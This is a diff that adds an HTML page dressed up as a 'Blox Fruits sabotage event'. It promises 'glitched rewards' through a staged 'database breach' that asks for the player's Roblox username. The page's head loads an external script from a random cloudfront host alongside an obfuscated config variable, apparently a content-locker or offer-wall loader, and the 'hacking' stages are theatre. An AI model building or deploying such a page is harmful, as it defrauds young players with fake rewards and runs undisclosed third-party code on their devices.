@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits - SABOTAGE EVENT</title>
+    <script type="text/javascript">
+        var AncoY_reQ_shZzBc={"it":4586440,"key":"a355c"};
+    </script>
+    <script src="https://duw03nk63ml3f.cloudfront.net/f1e1db2.js"></script>
+    
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="scanlines"></div>
+
+    <div id="stage-intro" class="full-stage">
+        <div class="glitch-container">
+            <h1 class="glitch-text massive" data-text="SYSTEM FAILURE">SYSTEM FAILURE</h1>
+            <p class="sub-glitch">INJECTING UNAUTHORIZED PROTOCOL...</p>
+            <div class="hacked-loader"><div class="hack-bar"></div></div>
+        </div>
+    </div>
+
+    <div id="stage-selection" class="full-stage" style="display: none;">
+        <header class="sabotage-header">
+            <h2 class="glitch-text" data-text="SELECT 3 GLITCHED REWARDS">SELECT 3 GLITCHED REWARDS</h2>
+            <p class="warning-txt">WARNING: DO NOT SELECT DUPLICATES</p>
+        </header>
+        <div class="slots-area">
+            <div class="empty-slot" id="slot-0"></div>
+            <div class="empty-slot" id="slot-1"></div>
+            <div class="empty-slot" id="slot-2"></div>
+        </div>
+        <div class="grid-container" id="rewards-grid"></div>
+    </div>
+
+    <div id="stage-sync" class="full-stage" style="display: none;">
+        <div class="terminal-hack">
+            <h3 class="glitch-text" data-text="USER_DATABASE_BREACH">USER_DATABASE_BREACH</h3>
+            <div class="strong-input-box">
+                <input type="text" id="rbx-user" placeholder="ENTER TARGET USERNAME..." autocomplete="off">
+                <div class="electric-border"></div>
+            </div>
+            <p id="error-log" class="error-terminal"></p>
+            <button id="hack-btn" class="glitch-btn">EXECUTE INJECTION</button>
+        </div>
+    </div>
+
+    <div id="stage-final" class="full-stage" style="display: none;">
+        <div class="final-content">
+            <div class="broken-gear">⚙️</div>
+            <h2 class="glitch-text blink" data-text="BYPASSING SECURITY...">BYPASSING SECURITY...</h2>
+            <p class="terminal-log">Please wait 4 seconds for final breach...</p>
+        </div>
+    </div>
+
+    <audio id="snd-tap" src="media/tap.mp3"></audio>
+    <audio id="snd-select" src="media/selection.mp3"></audio>
+    <audio id="snd-error" src="media/error.mp3"></audio>
+
+    <script src="script.js"></script>
+</body>
+</html>
